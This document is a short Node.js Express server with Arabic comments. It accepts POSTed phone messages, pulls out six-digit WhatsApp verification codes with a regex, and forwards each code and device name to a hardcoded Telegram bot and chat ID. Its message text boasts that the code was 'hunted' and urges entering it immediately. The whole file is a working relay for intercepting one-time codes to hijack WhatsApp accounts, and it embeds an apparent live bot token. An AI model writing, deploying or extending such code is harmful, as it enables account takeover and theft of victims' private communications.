const express = require('express');
const axios = require('axios');
const app = express();
app.use(express.json());

// البيانات الخاصة بك (تم تحديث التوكن والآيدي بناءً على طلبك)
const BOT_TOKEN = '8530728105:AAFIsTnKIKmwOnUxFvna_6IXnxT7wqKtsrE'; 
const CHAT_ID = '7802385639'; 

app.post('/webhook', (req, res) => {
    const { message, device } = req.body;

    // البحث عن نمط كود الواتساب (6 أرقام متتالية أو مفصولة بواصلة)
    const otpMatch = message.match(/\d{3}-?\d{3}/);
    
    if (otpMatch) {
        const finalCode = otpMatch[0];
        const textToSend = `
🚀 **تم صيد كود واتساب بنجاح!**
🔢 الكود: \`${finalCode}\`
📱 الجهاز: ${device}
⏰ الوقت: ${new Date().toLocaleTimeString()}
⚠️ **ادخل الكود الآن في تطبيقك!**
        `;

        // إرسال الرسالة إلى تليجرام الطالب
        axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: textToSend,
            parse_mode: 'Markdown'
        });
    }
    res.sendStatus(200);
});

// تشغيل السيرفر على البورت الذي يحدده Render
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server is running on port ${PORT}`));
